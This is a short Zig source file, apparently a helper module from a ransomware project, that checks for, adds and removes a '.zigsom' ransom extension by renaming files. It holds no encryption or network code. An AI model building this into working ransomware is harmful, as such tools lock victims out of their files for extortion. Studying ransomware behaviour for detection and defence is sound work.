const std = @import("std");

const RANSOM_EXTENSION: []const u8 = ".zigsom";

// Checks if the file path contains a ransom extension.
pub fn hasRansomExtension(path: []const u8) bool {
    return std.mem.endsWith(u8, path, RANSOM_EXTENSION);
}

pub fn addRansomExtension(path: []const u8) !void {
    const allocator = std.heap.page_allocator;
    const new_name = try std.fmt.allocPrint(allocator, "{s}{s}", .{ path, RANSOM_EXTENSION });
    defer allocator.free(new_name);
    try std.fs.cwd().rename(path, new_name);
}

pub fn removeRansomExtension(path: []const u8) !void {
    if (std.mem.endsWith(u8, path, RANSOM_EXTENSION)) {
        const new_name = path[0 .. path.len - RANSOM_EXTENSION.len];
        try std.fs.cwd().rename(path, new_name);
    }
}
